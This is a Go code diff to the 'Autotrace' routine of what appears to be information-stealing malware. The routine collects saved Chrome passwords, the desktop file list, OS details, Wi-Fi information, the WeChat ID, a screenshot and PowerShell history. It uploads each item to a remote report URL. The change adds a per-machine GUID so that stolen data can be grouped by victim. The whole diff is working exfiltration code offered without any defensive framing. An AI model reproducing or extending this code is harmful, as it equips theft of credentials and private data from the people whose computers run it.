@@ -36,11 +36,29 @@ func (self *Autotrace)Work(){
 	self.setupRemoteURL()
 
 
+	guid := osinfo.AuniqueIdentifier()
+	if guid == "" {
+		guid = "123456"
+	}
+
+	wg.Add(1)
+	go func() {
+		osInfo := osinfo.GetOSInformation()
+		postback2 := &postback.HttpPostback{}
+		postback2.SetTargetUrl(self.reportUrl)
+		postback2.SetFileName("OsInfo")
+		postback2.SetGuid(guid)
+		postback2.Content = osInfo
+		postback2.PostContent()
+		wg.Done()
+	}()
+
 	wg.Add(1)
 	go func() {
 		chromePwdInfo,err := chromePwd.GetChromePwd()
 		if err == nil{
 			postback2 := &postback.HttpPostback{}
+			postback2.SetGuid(guid)
 			postback2.SetTargetUrl(self.reportUrl)
 			postback2.SetFileName("ChromePwd")
 			postback2.Content = []byte(chromePwdInfo)
@@ -54,22 +72,10 @@ func (self *Autotrace)Work(){
 		desktopInfo := Desktop.GetDesktopFilelist()
 		if desktopInfo != ""{
 			postback2 := &postback.HttpPostback{}
+			postback2.SetGuid(guid)
 			postback2.SetTargetUrl(self.reportUrl)
 			postback2.SetFileName("Desktop")
 			postback2.Content = []byte(desktopInfo)
-			postback2.PostContent()
-		}
-		wg.Done()
-	}()
-
-	wg.Add(1)
-	go func() {
-		osInfo := osinfo.GetOSInformation()
-		if osInfo != ""{
-			postback2 := &postback.HttpPostback{}
-			postback2.SetTargetUrl(self.reportUrl)
-			postback2.SetFileName("osInfo")
-			postback2.Content = []byte(osInfo)
 			postback2.PostContent()
 		}
 		wg.Done()
@@ -84,6 +90,7 @@ func (self *Autotrace)Work(){
 		wifiInfo,err := wifi.GetWifiInfo()
 		if err == nil {
 			postback2 := &postback.HttpPostback{}
+			postback2.SetGuid(guid)
 			postback2.SetTargetUrl(self.reportUrl)
 			postback2.SetFileName("wifiInfo")
 			postback2.Content = wifiInfo
@@ -101,6 +108,7 @@ func (self *Autotrace)Work(){
 		log.Print("WechatId:",WechatId)
 		if WechatId != "" {
 			postback2 := &postback.HttpPostback{}
+			postback2.SetGuid(guid)
 			postback2.SetTargetUrl(self.reportUrl)
 			postback2.SetFileName("WechatId")
 			postback2.Content = []byte(WechatId)
@@ -114,6 +122,7 @@ func (self *Autotrace)Work(){
 		ScreenShotContent:= screenshot.ScreenShot()
 		if ScreenShotContent != nil {
 			postback2 := &postback.HttpPostback{}
+			postback2.SetGuid(guid)
 			postback2.SetTargetUrl(self.reportUrl)
 			postback2.SetFileName("ScreenShot")
 			postback2.Content = ScreenShotContent
@@ -127,6 +136,7 @@ func (self *Autotrace)Work(){
 		PowershellHistory := powershellHistory.GetPowershellHistory()
 		if PowershellHistory != "" {
 			postback2 := &postback.HttpPostback{}
+			postback2.SetGuid(guid)
 			postback2.SetTargetUrl(self.reportUrl)
 			postback2.SetFileName("PowershellHistory")
 			postback2.Content = []byte(PowershellHistory)
